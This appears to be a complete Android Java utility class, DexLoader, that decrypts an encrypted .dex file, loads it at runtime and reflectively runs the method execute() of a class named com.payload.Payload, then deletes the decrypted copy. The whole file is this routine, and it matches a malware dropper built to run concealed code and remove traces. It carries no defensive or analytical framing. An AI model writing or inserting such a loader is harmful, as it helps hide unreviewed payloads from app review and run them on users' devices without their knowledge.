package com.mobilemorph.agent.utils;

import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;

import android.content.Context;
import android.os.Build;
import androidx.annotation.RequiresApi;
import androidx.security.crypto.EncryptedFile;
import androidx.security.crypto.MasterKeys;

import dalvik.system.DexClassLoader;

public class DexLoader {
    @RequiresApi(api = Build.VERSION_CODES.M)
    public static void loadAndExecute(Context context, String dexPath) {
        try {
            // Step 1: Setup encrypted file reference
            File encryptedDex = new File(dexPath);
            File decryptedDex = new File(context.getFilesDir(), "decrypted_payload.dex");

            EncryptedFile encryptedFile = new EncryptedFile.Builder(
                    encryptedDex,
                    context,
                    MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC),
                    EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB
            ).build();

            // Step 2: Decrypt into temporary file
            try (InputStream in = encryptedFile.openFileInput();
                 OutputStream out = new FileOutputStream(decryptedDex)) {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
            }

            // Step 3: Load and execute
            File optimizedDir = context.getDir("dexopt", Context.MODE_PRIVATE);

            DexClassLoader classLoader = new DexClassLoader(
                    decryptedDex.getAbsolutePath(),
                    optimizedDir.getAbsolutePath(),
                    null,
                    context.getClassLoader()
            );

            Class<?> clazz = classLoader.loadClass("com.payload.Payload");
            Object instance = clazz.newInstance();
            Method method = clazz.getMethod("execute");
            method.invoke(instance);

            // Optional: Delete decrypted file after execution
            decryptedDex.delete();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
